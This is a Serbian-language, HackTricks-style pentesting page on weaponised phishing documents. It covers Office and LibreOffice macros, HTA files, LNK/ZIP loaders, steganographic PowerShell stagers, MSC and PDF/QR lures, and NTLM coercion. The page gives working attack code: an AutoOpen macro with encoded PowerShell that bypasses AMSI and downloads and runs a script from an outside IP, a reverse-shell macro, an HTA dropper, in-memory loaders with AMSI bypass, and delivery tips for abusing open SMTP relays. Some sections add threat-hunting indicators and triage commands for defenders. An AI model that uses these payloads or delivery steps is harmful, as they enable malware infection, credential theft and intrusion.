# Phishing fajlovi i dokumenti

{{#include ../../banners/hacktricks-training.md}}

## Office dokumenti

Microsoft Word obavlja validaciju podataka u fajlu pre nego što ga otvori. Validacija podataka se vrši identifikacijom strukture podataka, u skladu sa standardom OfficeOpenXML. Ako dođe do greške tokom identifikacije strukture podataka, analizirani fajl neće biti otvoren.

Obično Word fajlovi koji sadrže makroe koriste ekstenziju `.docm`. Međutim, moguće je preimenovati fajl promenom ekstenzije, a da pritom zadrži mogućnost izvršavanja makroa.\
Na primer, RTF fajl po dizajnu ne podržava makroe, ali Microsoft Word će obraditi DOCM fajl preimenovan u RTF i moći će da izvrši makroe.\
Isti interni mehanizmi važe za sve programe iz paketa Microsoft Office (Excel, PowerPoint itd.).

Pomoću sledeće komande možete da proverite koje ekstenzije će izvršavati neki Office programi:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX datoteke koje upućuju na udaljeni template (File –Options –Add-ins –Manage: Templates –Go) koji sadrži makroe takođe mogu da „izvrše“ makroe.

### Učitavanje spoljne slike

Idite na: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Office Documents - Učitavanje spoljne slike: Idite na: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

Za analizu primljenog dokumenta umesto kreiranja novog, pogledajte [Analiza VBA makroa: junk code i UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms).

### Backdoor pomoću makroa

Makroi mogu da se koriste za pokretanje proizvoljnog koda iz dokumenta.

#### Funkcije za automatsko učitavanje

Što su češće, veća je verovatnoća da će ih AV detektovati.

- AutoOpen()
- Document_Open()

#### Primeri koda za makroe

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Ručno uklanjanje metapodataka

Idite na **File > Info > Inspect Document > Inspect Document**, čime ćete otvoriti Document Inspector. Kliknite na **Inspect**, a zatim na **Remove All** pored stavke **Document Properties and Personal Information**.

#### Ekstenzija dokumenta

Kada završite, izaberite padajući meni **Save as type** i promenite format iz **`.docx`** u Word 97-2003 **`.doc`**.\
Uradite to zato što **ne možete da sačuvate makroe unutar `.docx`** datoteke i zato što postoji **negativna stigma** vezana za ekstenziju **`.docm`** koja podržava makroe (npr. ikona sličice ima veliko `!`, a neki web/email gateway-i ih u potpunosti blokiraju). Zato je ova **zastarela ekstenzija `.doc` najbolji kompromis**.

#### Generatori zlonamernih makroa

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Makroi za automatsko pokretanje u LibreOffice ODT dokumentima (Basic)

LibreOffice Writer dokumenti mogu da sadrže Basic makroe i da ih automatski izvrše kada se datoteka otvori, tako što se makro poveže sa događajem **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Jednostavan makro za reverse shell izgleda ovako:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Obratite pažnju na udvojene navodnike (`""`) unutar stringa – LibreOffice Basic koristi ih za escape doslovnih navodnika, pa payloadi koji se završavaju sa `...==""")` imaju pravilno uparene i unutrašnju komandu i argument za Shell.

Saveti za isporuku:

- Sačuvajte dokument kao `.odt` i povežite makro sa događajem dokumenta kako bi se odmah pokrenuo pri otvaranju.
- Kada šaljete e-poštu pomoću `swaks`, koristite `--attach @resume.odt` (znak `@` je obavezan da bi se kao prilog poslali bajtovi datoteke, a ne njen naziv). Ovo je ključno kada se zloupotrebljavaju SMTP serveri koji prihvataju proizvoljne primaoce `RCPT TO` bez validacije.

## HTA datoteke

HTA je Windows program koji **kombinuje HTML i skriptne jezike (kao što su VBScript i JScript)**. Generiše korisnički interfejs i izvršava se kao „potpuno pouzdana“ aplikacija, bez ograničenja bezbednosnog modela pregledača.

HTA se izvršava pomoću **`mshta.exe`**, koji se obično **instalira** zajedno sa **Internet Explorerom**, zbog čega `mshta` zavisi od IE-a. Dakle, ako je deinstaliran, HTA datoteke neće moći da se izvrše.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Lažne kartice priloga u HTML emailu

HTML email može da imitira izvornu karticu za pregled priloga nekog provajdera, a da pritom ne sadrži pravi prilog. Talos je zabeležio Gmail karticu sastavljenu od četiri Base64-enkodirana inline PNG MIME dela. Ceo vizuelni element bio je obuhvaćen jednim anchor elementom, a vrednost primaoca u `?m=<target-id>` omogućavala je praćenje po primaocu. Link je počinjao sa `//`, a ne sa `http://` ili `https://`; pregledači razrešavaju ovaj oblik relativan u odnosu na protokol, ali alati za izdvajanje URL-ova koji prepoznaju samo potpuno kvalifikovane URL-ove mogu da ga previde.<sup>[[11]](#references)</sup>

Tokom analize pregledajte sirovi MIME umesto da verujete prikazanom spisku priloga. Rekonstruišite kako se inline delovi slike uklapaju u vizuelnu karticu, identifikujte anchor element koji je obuhvata i normalizujte `href` vrednosti relativne u odnosu na protokol pre izdvajanja URL-ova.<sup>[[11]](#references)</sup>

Za testiranje spoofing-a pošiljaoca u envelope/header poljima i DMARC usklađenosti, pogledajte [SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## Forsiranje NTLM Authentication

Postoji nekoliko načina da **„daljinski“ forsirate NTLM authentication**. Na primer, možete da dodate **nevidljive slike** u emailove ili HTML kojima će korisnik pristupiti (čak i HTTP MitM?). Ili pošaljite žrtvi **putanju do fajlova** koji će **pokrenuti** **authentication** samim **otvaranjem foldera**.

**Proverite ove i druge ideje na sledećim stranicama:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Ne zaboravite da ne možete samo da ukradete hash ili authentication, već možete i da **izvršite NTLM relay napade**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + Payloads ugrađeni u ZIP (fileless chain)

Veoma efikasne kampanje isporučuju ZIP koji sadrži dva legitimna dokumenta-mamca (PDF/DOCX) i zlonamerni .lnk. Trik je u tome što je stvarni PowerShell loader smešten unutar sirovih bajtova ZIP fajla, iza jedinstvenog markera, a .lnk izdvaja payload i pokreće ga u potpunosti u memoriji.<sup>[[2]](#references)</sup>

Tipičan tok koji implementira PowerShell jednolinijski kod u .lnk fajlu:

1) Pronađite originalni ZIP na uobičajenim lokacijama: Desktop, Downloads, Documents, %TEMP%, %ProgramData% i u nadređenom direktorijumu trenutnog radnog direktorijuma.
2) Pročitajte bajtove ZIP-a i pronađite hardkodirani marker (npr. xFIQCV). Sve nakon markera predstavlja ugrađeni PowerShell payload.
3) Kopirajte ZIP u %ProgramData%, raspakujte ga tamo i otvorite lažni .docx kako bi sve izgledalo legitimno.
4) Zaobiđite AMSI za trenutni proces: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuskirajte sledeću fazu (npr. uklonite sve znakove #) i izvršite je u memoriji.

Primer PowerShell kostura koda za izdvajanje i pokretanje ugrađene faze:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Beleške
- Isporuka često zloupotrebljava poddomene renomiranih PaaS platformi (npr. *.herokuapp.com) i može da ograniči isporuku payloada (poslužuje bezopasne ZIP fajlove na osnovu IP/UA).
- Sledeća faza često dešifruje base64/XOR shellcode i izvršava ga pomoću Reflection.Emit + VirtualAlloc kako bi se smanjili tragovi na disku.

Persistence korišćen u istom lancu
- COM TypeLib hijacking Microsoft Web Browser kontrole, tako da IE/Explorer ili bilo koja aplikacija koja je ugrađuje automatski ponovo pokrene payload.<sup>[[2]](#references)[[4]](#references)</sup> Detalje i komande spremne za upotrebu pogledajte ovde:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Lov na pretnje/IOCs
- ZIP fajlovi koji sadrže ASCII marker string (npr. xFIQCV) dodat na podatke arhive.
- .lnk koji pretražuje nadređene/korisničke fascikle kako bi pronašao ZIP i otvorio dokument-mamac.
- AMSI manipulisanje pomoću [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Dugačke poslovne e-mail prepiske koje se završavaju linkovima na pouzdanim PaaS domenima.

## LNK prvo prikazuje mamac → persistence putem zakazanog zadatka → trusted CPL side-loading

Još jedan obrazac koji se često ponavlja jeste **`.lnk` koji se predstavlja kao dokument** i odmah otvara bezopasan mamac, dok u pozadini priprema pravi lanac.<sup>[[3]](#references)</sup>

Uočeni tok:
1. Prečica **se predstavlja kao PDF** i koristi `conhost.exe` ili sličan proxy za pokretanje obfuskovanog PowerShell downloadera.
2. PowerShell razdvaja očigledne tokene (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), tako da jednostavne detekcije koje traže `iwr`, `gci`, `ren`, `cpi` ili `schtasks` ne prepoznaju komandu.
3. Stager prvo preuzima **dokument-mamac**, otvara ga žrtvi, a zatim u pozadini rekonstruiše zlonamerne fajlove.
4. Payloadi mogu biti zapisani sa **lažnim ekstenzijama**, a zatim preimenovani uklanjanjem dodatnih znakova, čime se odlaže pojava očiglednih `.exe` / `.cpl` fajlova.
5. Persistence se uspostavlja pomoću **zakazanog zadatka koji se pokreće svakog minuta** i pokreće pouzdani host binary sa putanje u koju korisnik može da upisuje.

Minimalni tragovi za lov na pretnje u ovom obrascu:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Prepoznatljiv raspored za staging:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` ili `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Zašto je druga faza prikrivena

U studiji slučaja kompanije Rapid7, zakazani zadatak je više puta pokretao **`Fondue.exe`** iz direktorijuma `C:\Users\Public\`. Pošto je **`APPWIZ.cpl`** bio postavljen pored njega i izvozio **`RunFODW`**, pouzdana Microsoftova binarna datoteka učitala je attackerov CPL umesto legitimne sistemske kopije.

CPL zatim:
- Čita **AES-256-CBC** blob iz `C:\Windows\Tasks\editor.dat`
- Dešifruje ga pomoću **Windows CNG / `bcrypt.dll`**
- Dodeljuje izvršivu memoriju i kopira u nju dešifrovani shellcode
- Posredno ga izvršava tako što pokazivač na shellcode prosleđuje kao callback funkciji **`EnumUILanguagesW`**

Vredi posebno tražiti ovaj poslednji korak: malware često izbegava direktan skok `((void(*)())buf)()` i umesto toga zloupotrebljava **legitimni WinAPI koji prihvata callback** za prenos izvršavanja.

Dešifrovani payload u ovoj kampanji bio je **Donut** shellcode, koji je zatim u potpunosti mapirao završni PE u memoriju i zakrpio **AMSI/WLDP/ETW** u tekućem procesu pre nego što je predao izvršavanje. Detaljnije informacije o side-loading-u i naknadnoj obradi u memoriji potražite ovde:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktični pokazatelji za hunting:
- `.lnk` pokreće `powershell.exe` ili `conhost.exe`, a zatim se prikazuje dokument-mamac.
- Kratkotrajna preuzimanja u **`C:\Users\Public\`**, praćena neposrednim preimenovanjem datoteka sa besmislenim ekstenzijama.
- Zakazani zadaci sa neupadljivim imenima, kao što je `GoogleErrorReport`, koji se izvršavaju iz **direktorijuma u koje korisnik može da upisuje**.
- Pouzdane binarne datoteke učitavaju **`.cpl` / `.dll`** datoteke iz istog direktorijuma koji nije sistemski.
- Base64 tekstualni blobovi upisuju se u **`C:\Windows\Tasks\`**, a zatim ih čita side-loaded modul.

## Payload-i omeđeni steganografskim oznakama u slikama (PowerShell stager)

Noviji lanci učitavanja isporučuju zamaskirani JavaScript/VBS koji dekodira i pokreće Base64 PowerShell stager. Taj stager preuzima sliku (često GIF) koja sadrži Base64-kodiranu .NET DLL sakrivenu kao običan tekst između jedinstvenih početnih i završnih oznaka. Skripta traži ove razdelnike (primeri zabeleženi u praksi: «<<sudo_png>> … <<sudo_odt>>>»), izdvaja tekst između njih, Base64-dekodira ga u bajtove, učitava assembly u memoriju i poziva poznatu ulaznu metodu uz C2 URL.<sup>[[5]](#references)</sup>

Tok rada
- Faza 1: Arhivirani JS/VBS dropper → dekodira ugrađeni Base64 → pokreće PowerShell stager sa -nop -w hidden -ep bypass.
- Faza 2: PowerShell stager → preuzima sliku, izdvaja Base64 omeđen oznakama, učitava .NET DLL u memoriju i poziva njenu metodu (npr. VAI), prosleđujući joj C2 URL i opcije.
- Faza 3: Loader preuzima završni payload i obično ga ubacuje pomoću process hollowing-a u pouzdanu binarnu datoteku (najčešće MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Više o process hollowing-u i proxy izvršavanju preko pouzdanih uslužnih programa potražite ovde:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Primer PowerShell-a za izdvajanje DLL-a iz slike i pozivanje .NET metode u memoriji:

<details>
<summary>PowerShell extractor i loader za stego payload</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Napomene
- Ovo je ATT&CK T1027.003 (steganografija/skrivanje markera).<sup>[[6]](#references)</sup> Markeri se razlikuju među kampanjama.
- AMSI/ETW bypass i deobfuskacija stringova često se primenjuju pre učitavanja assembly-ja.
- Hunting: skenirajte preuzete slike u potrazi za poznatim delimiterima; pronađite PowerShell procese koji pristupaju slikama i odmah dekodiraju Base64 blobove.

Pogledajte i stego alate i tehnike izdvajanja podataka:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Česta početna faza je mala, snažno obfuscirana `.js` ili `.vbs` datoteka dostavljena unutar arhive. Njena jedina svrha je da dekodira ugrađeni Base64 string i pokrene PowerShell sa `-nop -w hidden -ep bypass` kako bi pokrenula sledeću fazu preko HTTPS-a.<sup>[[5]](#references)</sup>

Osnovna logika (apstraktno):
- Pročitati sadržaj sopstvene datoteke
- Pronaći Base64 blob između nasumičnih stringova
- Dekodirati u ASCII PowerShell
- Izvršiti pomoću `wscript.exe`/`cscript.exe` koji pokreće `powershell.exe`

Indikatori za hunting
- Arhivirani JS/VBS prilozi koji pokreću `powershell.exe`, sa `-enc`/`FromBase64String` u komandnoj liniji.
- `wscript.exe` koji pokreće `powershell.exe -nop -w hidden` iz privremenih putanja korisnika.

## MSC dokumenti kao kontejneri za izvršavanje (GrimResource)

Microsoft Management Console datoteke (`.msc`) su XML definicije konzola koje se obično otvaraju pomoću `mmc.exe`. **GrimResource** zloupotrebljava referencu `StringTable` na resurs `apds.dll` koji sadrži stari XSS primitiv, tako da se pri otvaranju posebno pripremljene konzole pokreće JavaScript unutar `mmc.exe`. Uočeni primerci kombinovali su obfuskaciju zasnovanu na `transformNode` sa **DotNetToJScript** kako bi instancirali .NET payload bez uobičajenog puta kroz Office makroe.<sup>[[9]](#references)</sup>

Za statičku trijažu, tretirajte nepouzdani MSC kao tekst i **nemojte** ga otvarati dvostrukim klikom:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Visokosignalni indikatori tokom izvršavanja su kada `mmc.exe` učitava CLR ili skriptne komponente, uspostavlja mrežne veze ili pokreće `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` ili neočekivani izvršni fajl. Format je legitiman, pa detekcije treba da korelišu **poreklo + sumnjiv XML/skriptni sadržaj + ponašanje `mmc.exe`**, umesto da blokiraju svaki MSC.<sup>[[9]](#references)</sup>

## PDF/QR preusmerivači i kontrola isporuke payload-a

PDF ne mora da sadrži exploit da bi bio koristan. Nedavne kampanje postavljaju **QR kod ili običan link** u dokument koji deluje bezazleno, preusmeravaju sesiju pregledača dalje od kontrola e-pošte i personalizuju odredište adresom primaoca. Microsoft je dokumentovao PDF-ove iz 2025. sa QR URL-ovima jedinstvenim za svakog primaoca, koji su vodili do infrastrukture za krađu akreditiva RaccoonO365; paralelni lanac koristio je IP/environment gating da posetiocima koji ispunjavaju uslove vrati putanju ka JavaScript/MSI fajlu, a skenerima ili nedozvoljenim klijentima bezazleni PDF.<sup>[[10]](#references)</sup>

Tokom trijaže proverite i PDF akcije i renderovane QR kodove. QR kod može biti nacrtan kao vektor, umesto da bude sačuvan kao slika koja se može izdvojiti, pa rasterizujte svaku stranicu i izdvojte ugrađene slike:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Pregledajte dekodirana odredišta i redirect-e iz izolovanog sistema za analizu, bez prijavljivanja. Korisne karakteristike za threat hunting obuhvataju PDF-ove koji sadrže samo QR kod, gotovo prazne poruke e-pošte, email primaoca ugrađen u query parametar, nekoliko redirect-a preko pouzdanih hosting servisa i različit sadržaj koji se vraća u zavisnosti od IP adrese, geolokacije, kolačića, referrera ili user agenta. Uporedite zahteve koristeći kontrolisane profile jer jedan sandbox fetch može da dobije samo mamac.<sup>[[10]](#references)</sup>

## Windows fajlovi za krađu NTLM hash-eva

Pogledajte stranicu o **mestima za krađu NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Kampanja ZipLine: sofisticirani phishing napad usmeren na američke kompanije](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Praćenje tradecraft-a grupe Dropping Elephant kroz lanac loader-a sa temom Kine](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Otmi TypeLib – Nova COM tehnika perzistencije (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI loader isporučuje niz infostealer-a](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganografija (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Proxy izvršavanje pomoću pouzdanih developerskih alata: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console za početni pristup i izbegavanje detekcije](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Akteri pretnji koriste poresku sezonu za sprovođenje phishing kampanja sa temom poreza](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – Lanac isporuke UAT-11587 i backdoor Antino](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
{{#include ../../banners/hacktricks-training.md}}
